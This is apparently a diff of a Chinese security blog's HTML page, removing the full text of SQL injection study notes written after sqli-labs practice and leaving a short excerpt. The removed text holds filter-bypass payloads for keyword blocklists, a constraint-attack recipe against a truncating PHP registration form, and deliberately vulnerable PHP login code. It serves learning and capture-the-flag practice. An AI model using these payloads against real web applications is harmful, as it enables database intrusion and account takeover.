-<td>21</td>
-<td>L</td>
-</tr>
-<tr>
-<td>true+true</td>
-<td>2</td>
-<td>ceil(pi()+pi()+version())</td>
-<td>12</td>
-<td>C</td>
-<td>ceil(pi()*ceil(pi()+pi()))</td>
-<td>22</td>
-<td>M</td>
-</tr>
-<tr>
-<td>floor(pi());~~pi()</td>
-<td>3</td>
-<td>floor(pi()*pi()+pi())</td>
-<td>13</td>
-<td>D</td>
-<td>ceil((pi()+ceil(pi()))*pi())</td>
-<td>23</td>
-<td>N</td>
-</tr>
-<tr>
-<td>ceil(pi())</td>
-<td>4</td>
-<td>ceil(pi()*pi()+pi())</td>
-<td>14</td>
-<td>E</td>
-<td>ceil(pi())*ceil(version())</td>
-<td>24</td>
-<td>O</td>
-</tr>
-<tr>
-<td>floor(version()) //注意版本</td>
-<td>5</td>
-<td>ceil(pi()*pi()+version())</td>
-<td>15</td>
-<td>F</td>
-<td>floor(pi()*(version()+pi()))</td>
-<td>25</td>
-<td>P</td>
-</tr>
-<tr>
-<td>ceil(version())</td>
-<td>6</td>
-<td>floor(pi()*version())</td>
-<td>16</td>
-<td>G</td>
-<td>floor(version()*version())</td>
-<td>26</td>
-<td>Q</td>
-</tr>
-<tr>
-<td>ceil(pi()+pi())</td>
-<td>7</td>
-<td>ceil(pi()*version())</td>
-<td>17</td>
-<td>H</td>
-<td>ceil(version()*version())</td>
-<td>27</td>
-<td>R</td>
-</tr>
-<tr>
-<td>floor(version()+pi())</td>
-<td>8</td>
-<td>ceil(pi()*version())+true</td>
-<td>18</td>
-<td>I</td>
-<td>ceil(pi()*pi()*pi()-pi())</td>
-<td>28</td>
-<td>S</td>
-</tr>
-<tr>
-<td>floor(pi()*pi())</td>
-<td>9</td>
-<td>floor((pi()+pi())*pi())</td>
-<td>19</td>
-<td>J</td>
-<td>floor(pi()*pi()*floor(pi()))</td>
-<td>29</td>
-<td>T</td>
-</tr>
-</tbody></table>
-<h4 id="0x08-等于号，大于号，小于号"><a href="#0x08-等于号，大于号，小于号" class="headerlink" title="0x08 等于号，大于号，小于号"></a>0x08 等于号，大于号，小于号</h4><p>等于号可以通过like绕过，大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。</p>
-<h4 id="0x09-常见函数-符号总结"><a href="#0x09-常见函数-符号总结" class="headerlink" title="0x09 常见函数/符号总结"></a>0x09 常见函数/符号总结</h4><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><table>
-<thead>
-<tr>
-<th>单行注释</th>
-<th>单行注释</th>
-<th>单行注释</th>
-<th>多行(内联)注释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>#</code></td>
-<td><code>-- x //x为任意字符</code></td>
-<td><code>;%00</code></td>
-<td><code>/*任意内容*/</code></td>
-</tr>
-</tbody></table>
-<h5 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h5><table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>说明</th>
-<th>运算符</th>
-<th>说明</th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&amp;&amp;</td>
-<td>与，同and。</td>
-<td>\</td>
-<td>\</td>
-<td></td>
-<td>或，同or。</td>
-</tr>
-<tr>
-<td>!</td>
-<td>非，同not。</td>
-<td>~</td>
-<td>一元比特反转。</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>^</td>
-<td>异或，同xor。</td>
-<td>+</td>
-<td>加，可替代空格，如<code>select+user()</code>。</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>USER()</td>
-<td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td>
-</tr>
-<tr>
-<td>DATABASE()</td>
-<td>获取当前选择的数据库名，同SCHEMA()。</td>
-</tr>
-<tr>
-<td>VERSION()</td>
-<td>获取当前版本信息。</td>
-</tr>
-</tbody></table>
-<h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ORD(str)</td>
-<td>返回字符串第一个字符的ASCII值。</td>
-</tr>
-<tr>
-<td>OCT(N)</td>
-<td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td>
-</tr>
-<tr>
-<td>HEX(N_S)</td>
-<td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td>
-</tr>
-<tr>
-<td>UNHEX(str)</td>
-<td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td>
-</tr>
-<tr>
-<td>BIN(N)</td>
-<td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td>
-</tr>
-<tr>
-<td>ASCII(str)</td>
-<td>同<code>ORD(string)</code>。</td>
-</tr>
-<tr>
-<td>CONV(N,from_base,to_base)</td>
-<td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td>
-</tr>
-<tr>
-<td>CHAR(N,… [USING charset_name])</td>
-<td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td>
-</tr>
-</tbody></table>
-<h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h5><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>SUBSTR(str,N_start,N_length)</td>
-<td>对指定字符串进行截取，为SUBSTRING的简单版。</td>
-</tr>
-<tr>
-<td>SUBSTRING()</td>
-<td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td>
-</tr>
-<tr>
-<td>RIGHT(str,len)</td>
-<td>对指定字符串从<strong>最右边</strong>截取指定长度。</td>
-</tr>
-<tr>
-<td>LEFT(str,len)</td>
-<td>对指定字符串从<strong>最左边</strong>截取指定长度。</td>
-</tr>
-<tr>
-<td><strong>RPAD(str,len,padstr)</strong></td>
-<td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td>
-</tr>
-<tr>
-<td><strong>LPAD(str,len,padstr)</strong></td>
-<td>与RPAD相似，在<code>str</code>左边补齐。</td>
-</tr>
-<tr>
-<td>MID(str,pos,len)</td>
-<td>同于 <code>SUBSTRING(str,pos,len)</code>。</td>
-</tr>
-<tr>
-<td><strong>INSERT(str,pos,len,newstr)</strong></td>
-<td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td>
-</tr>
-<tr>
-<td>CONCAT(str1,str2…)</td>
-<td>函数用于将多个字符串合并为一个字符串</td>
-</tr>
-<tr>
-<td>GROUP_CONCAT(…)</td>
-<td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td>
-</tr>
-<tr>
-<td><strong>MAKE_SET(bits,str1,str2,…)</strong></td>
-<td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td>
-</tr>
-</tbody></table>
-<h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table>
-<thead>
-<tr>
-<th>变量</th>
-<th>说明</th>
-<th>变量</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>@@VERSION</td>
-<td>返回版本信息</td>
-<td>@@HOSTNAME</td>
-<td>返回安装的计算机名称</td>
-</tr>
-<tr>
-<td>@@GLOBAL.VERSION</td>
-<td>同<code>@@VERSION</code></td>
-<td>@@BASEDIR</td>
-<td>返回MYSQL绝对路径</td>
-</tr>
-</tbody></table>
-<p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p>
-<h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数/语句"></a>其他常用函数/语句</h5><table>
-<thead>
-<tr>
-<th>函数/语句</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LENGTH(str)</td>
-<td>返回字符串的长度。</td>
-</tr>
-<tr>
-<td>PI()</td>
-<td>返回π的具体数值。</td>
-</tr>
-<tr>
-<td>REGEXP “statement”</td>
-<td>正则匹配数据，返回值为布尔值。</td>
-</tr>
-<tr>
-<td>LIKE “statement”</td>
-<td>匹配数据，%代表任意内容。返回值为布尔值。</td>
-</tr>
-<tr>
-<td>RLIKE “statement”</td>
-<td>与regexp相同。</td>
-</tr>
-<tr>
-<td>LOCATE(substr,str,[pos])</td>
-<td>返回子字符串第一次出现的位置。</td>
-</tr>
-<tr>
-<td>POSITION(substr IN str)</td>
-<td>等同于 <code>LOCATE()</code>。</td>
-</tr>
-<tr>
-<td>LOWER(str)</td>
-<td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td>
-</tr>
-<tr>
-<td>UPPER(str)</td>
-<td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td>
-</tr>
-<tr>
-<td>ELT(N,str1,str2,str3,…)</td>
-<td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td>
-</tr>
-<tr>
-<td>NULLIF(expr1,expr2)</td>
-<td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td>
-</tr>
-<tr>
-<td>CHARSET(str)</td>
-<td>返回字符串使用的字符集。</td>
-</tr>
-<tr>
-<td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td>
-<td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td>
-</tr>
-</tbody></table>
-<h4 id="0x0a-handler语句代替select-mysql"><a href="#0x0a-handler语句代替select-mysql" class="headerlink" title="0x0a handler语句代替select[mysql]"></a>0x0a handler语句代替select[mysql]</h4><blockquote>
-<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。[故其他数据库不可用]</p>
-</blockquote>
-<p>语法结构：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>
-
-<p>如：通过handler语句查询users表的内容</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> <span class="keyword">users</span> <span class="keyword">open</span> <span class="keyword">as</span> yunensec; <span class="comment">#指定数据表进行载入并将返回句柄重命名</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">first</span>; <span class="comment">#读取指定表/句柄的首行数据</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">close</span>; <span class="comment">#关闭句柄</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="0x0b-无列名注入"><a href="#0x0b-无列名注入" class="headerlink" title="0x0b 无列名注入"></a>0x0b 无列名注入</h4><p>在不知道列名的情况下，除了使用order by盲注外，还可以直接使用select进行盲注，即select无列名注入。例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`1`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>) <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure>
-
-<p>具体可以参考<a target="_blank" rel="noopener" href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-6-23-V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard_sql.md">V1lu0实验室招新hard_sql</a>或<a target="_blank" rel="noopener" href="https://x5tar.com/2019/10/24/cnss-recruit-2019-web/#hard-sql">CNSS 2019招新hard_sql</a>。</p>
-<h4 id="0x0c-其他"><a href="#0x0c-其他" class="headerlink" title="0x0c 其他"></a>0x0c 其他</h4><h5 id="UPDATE注入重复字段赋值"><a href="#UPDATE注入重复字段赋值" class="headerlink" title="UPDATE注入重复字段赋值"></a>UPDATE注入重复字段赋值</h5><p>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where子句]</code>，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如：</p>
-<p><code>UPDATE table_name set field1=new_value,field1=(select user()) [where子句]</code></p>
-<h5 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h5><p>举个例子，假设我们创建了一个数据表：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">users</span>(</span><br><span class="line">    username <span class="built_in">varchar</span>(<span class="number">25</span>),</span><br><span class="line">    <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">25</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>这时候我们进行登录注册的相关代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 注册</span><br><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; mysqli_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; addslashes(@$_POST[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; addslashes(@$_POST[&#39;password&#39;]);</span><br><span class="line">$sql1 &#x3D; &quot;select * from users where username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">$rs &#x3D; mysqli_query($conn,$sql1);</span><br><span class="line">if($rs-&gt;fetch_row())&#123;</span><br><span class="line">    die(&#39;账号已注册&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $sql2 &#x3D; &quot;insert into users values(&#39;$username&#39;,&#39;$password&#39;)&quot;;</span><br><span class="line">    mysqli_query($conn,$sql2);</span><br><span class="line">    die(&#39;注册成功&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 登录</span><br><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; mysqli_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; addslashes(@$_POST[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; addslashes(@$_POST[&#39;password&#39;]);</span><br><span class="line">$sql &#x3D; &quot;select * from users where username &#x3D; &#39;$username&#39; and password&#x3D;&#39;$password&#39;;&quot;;</span><br><span class="line">$rs &#x3D; mysqli_query($conn,$sql);</span><br><span class="line">if($rs-&gt;fetch_row())&#123;</span><br><span class="line">    $_SESSION[&#39;username&#39;]&#x3D;$password;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;fail&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这里没有编码问题，也进行了转移操作，由于存在长度限制，故可尝试sql约束攻击。注册名为<code>admin                         1</code>的用户名，密码自定，随后使用admin登录，密码就是刚刚的密码，发现登录成功。(原理，注册时select的时候，超长度的字段不会截取，故检查出未注册，而insert的时候会截取前25个字符，故再进行登录的时候’admin’=’admin                     ‘，从而登录成功)</p>
-<h4 id="0x0c-常见过滤绕过方法"><a href="#0x0c-常见过滤绕过方法" class="headerlink" title="0x0c 常见过滤绕过方法"></a>0x0c 常见过滤绕过方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1&#x3D;1 1 and 1&#x3D;1</span><br><span class="line">绕过方式    1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16))&#x2F;td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)&#x2F;td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
-
-<p>节选自：<a target="_blank" rel="noopener" href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
-
+          <p>今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1621,7 +740,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:45:10 / Modified: 10:45:24" itemprop="dateCreated datePublished" datetime="2020-08-28T10:45:10+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:45:10 / Modified: 13:43:18" itemprop="dateCreated datePublished" datetime="2020-08-28T10:45:10+08:00">2020-08-28</time>
             </span>
 
           
@@ -1635,107 +754,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h2><p>刷完了sqlilab，今天来总结一下注入的相关内容。</p>
-<h4 id="0x00-注入类别"><a href="#0x00-注入类别" class="headerlink" title="0x00 注入类别"></a>0x00 注入类别</h4><h5 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h5><ul>
-<li>数字型(没有引号)</li>
-<li>字符型(有引号)</li>
-</ul>
-<h5 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h5><ul>
-<li>GET型</li>
-<li>POST型</li>
-<li>COOKIE型</li>
-</ul>
-<h5 id="按注入方式分类"><a href="#按注入方式分类" class="headerlink" title="按注入方式分类"></a>按注入方式分类</h5><ul>
-<li>union联合查询注入</li>
-<li>报错注入</li>
-</ul>
-<ul>
-<li>盲注<ul>
-<li>基于时间的盲注</li>
-<li>基于布尔的盲注</li>
-</ul>
-</li>
-</ul>
-<h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><ul>
-<li>宽字节注入</li>
-</ul>
-<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul>
-<li>二次注入</li>
-<li>文件读写，DNSlog</li>
-</ul>
-<h4 id="0x01-可能存在注入的位置"><a href="#0x01-可能存在注入的位置" class="headerlink" title="0x01 可能存在注入的位置"></a>0x01 可能存在注入的位置</h4><p>1.GET数据</p>
-<p>2.POST数据</p>
-<p>3.http请求头</p>
-<p>4.cookie</p>
-<h4 id="0x02-引号-括号闭合方式"><a href="#0x02-引号-括号闭合方式" class="headerlink" title="0x02 引号/括号闭合方式"></a>0x02 引号/括号闭合方式</h4><p>主要有以下7种，判断的时候除了尝试外还需要根据报错信息(如果有的话)进行快速确定。</p>
-<p>总结一下常见的一些闭合方式：</p>
-<blockquote>
-<p>1.单引号闭合<code>&#39;</code></p>
-<p>2.双引号闭合<code>&quot;</code></p>
-<p>3.单引号加括号<code>&#39;)</code>‘</p>
-<p>4.双引号加括号<code>&#39;&quot;)</code></p>
-<p>5.括号(仅限数字型注入)<code>)</code></p>
-<p>6.单引号加双括号<code>&#39;))</code></p>
-<p>7.双引号加括号<code>&quot;))</code></p>
-</blockquote>
-<h4 id="0x03-联合查询注入的模板"><a href="#0x03-联合查询注入的模板" class="headerlink" title="0x03 联合查询注入的模板"></a>0x03 联合查询注入的模板</h4><p>联合查询注入主要借助 union select 来完成，一般payload：</p>
